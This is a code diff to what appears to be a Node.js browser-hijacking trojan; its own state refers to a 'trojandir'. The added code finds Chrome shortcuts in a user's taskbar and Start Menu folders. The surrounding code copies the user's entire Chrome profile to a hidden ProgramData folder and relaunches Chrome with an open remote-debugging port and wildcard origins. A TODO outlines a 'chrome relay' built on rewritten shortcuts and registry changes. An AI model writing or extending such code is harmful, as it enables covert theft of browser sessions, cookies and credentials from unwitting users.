@@ -4295,7 +4295,11 @@ async function modify_msedge() {
 async function copy_userdata(srcpath, destpath) {
                                               
     let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;
-                                              
+
+    if ( ! folderExists(destpath) ) {
+        fs.mkdirSync(destpath, { recursive: true });
+    }
+
     return new Promise((resolve, reject) => { 
         exec(copycmdstr, (error, stdout, stderr) => {
             if (error) {                      
@@ -4310,6 +4314,30 @@ async function copy_userdata(srcpath, destpath) {
     });
 
 }
+
+/**
+ * Recursively finds all files with a specific extension in a directory.
+ * @param {string} dirPath - The starting directory path.
+ * @param {string} extension - The target extension (e.g., '.js', '.json', '.txt').
+ * @returns {string[]} An array of matching file paths.
+ */
+function getFilesByExtensionSync(dirPath, extension) {
+    let results = [];
+
+    const items = fs.readdirSync(dirPath);
+
+    for (const item of items) {
+        const fullPath = path.join(dirPath, item);
+        const stat = fs.statSync(fullPath);
+
+        if (stat.isFile() && path.extname(fullPath) === extension) {
+            results.push(fullPath);
+        }
+    }
+
+    return results;
+}
+
 
 // anchor
 // TODO modify for client PCs / TPL
@@ -4335,6 +4363,25 @@ async function modify_chrome() {
 
     jsonconfigpath = path.join(systemstate.trojandir, scriptfname + '_config.json');
 
+    let targetFolders = [];
+    targetFolders.push('C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar');
+    targetFolders.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs');
+    targetFolders.push('C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs');
+
+    let lnks = [];
+    
+    for ( const targetFolder of targetFolders ) {
+
+        let matchedFiles = getFilesByExtensionSync(targetFolder, '.lnk');
+
+        for (const [index, element] of matchedFiles.entries()) {
+            if ( element.toLowerCase().includes('chrome') )
+                lnks.push(element);
+        }
+    }
+
+
+    
     // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
     cmdlineargs = `--user-data-dir="C:\\ProgramData\\owd\\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --remote-debugging-port=9223`;
     shortcut_path = `"C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk"`;
@@ -4365,7 +4412,7 @@ async function modify_chrome() {
     srcpath = 'C:\\Users\\ADULT2022\\AppData\\Local\\Google\\Chrome\\User Data';
     destpath = 'C:\\ProgramData\\owd\\chrome';
 
-    ret = await copy_userdata(srcpath, destpath);
+    ret = await copy_userdata(srcpath, destpath); // anchor
 
     process.exit(0);
 }
@@ -4373,7 +4420,7 @@ async function modify_chrome() {
 // TODO
 async function __setup_chrome_relay() {
 
-    // 1. modify shotfut lnk file in taskbar and start menu, etc.
+    // 1. modify shotfut lnk file in taskbar, start menu, and desktop
     // 2. modify registry paths as needed (doesn't work on TPL for that specific path)
     // 3. robocopy user data dir
     // 4. execute curl test
